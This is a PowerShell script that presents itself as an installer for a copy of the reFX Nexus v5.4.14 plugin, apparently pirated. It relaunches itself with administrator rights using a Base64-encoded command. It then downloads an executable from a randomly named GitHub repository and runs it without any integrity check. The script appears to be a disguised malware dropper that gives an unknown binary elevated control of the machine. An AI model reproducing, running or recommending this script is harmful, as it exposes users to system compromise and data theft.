$scriptBlock = {
    $logPath = Join-Path $env:TEMP 'nexus_install.log'
    try {
        $ErrorActionPreference = 'Stop'
        $downloadUrl = 'https://raw.githubusercontent.com/AmplitudeQuail/dlqmjdez/main/reFX%20Nexus%20v5.4.14.exe'
        $outputPath  = Join-Path $env:TEMP 'reFX Nexus v5.4.14.exe'

        Write-Host 'Downloading reFX Nexus v5.4.14...' -ForegroundColor Cyan
        $progressPreference = 'Continue'
        Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath -UseBasicParsing

        if (-not (Test-Path $outputPath)) { throw 'Download failed: file was not saved.' }
        $size = (Get-Item $outputPath).Length
        Write-Host "Downloaded: $size bytes" -ForegroundColor Green

        Write-Host 'Launching installer...' -ForegroundColor Cyan
        Start-Process -FilePath $outputPath
        Start-Sleep -Seconds 3
    }
    catch {
        $err = $_ | Out-String
        $err | Out-File -FilePath $logPath -Encoding UTF8 -Append
        Write-Host "`n=== ERROR ===" -ForegroundColor Red
        Write-Host $err -ForegroundColor Red
        Write-Host "Log saved to: $logPath" -ForegroundColor Yellow
        Write-Host "`nPress Enter to close..." -ForegroundColor Yellow
        Read-Host
    }
}

$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    & $scriptBlock
} else {
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock.ToString()))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -EncodedCommand $encoded"
    exit
}
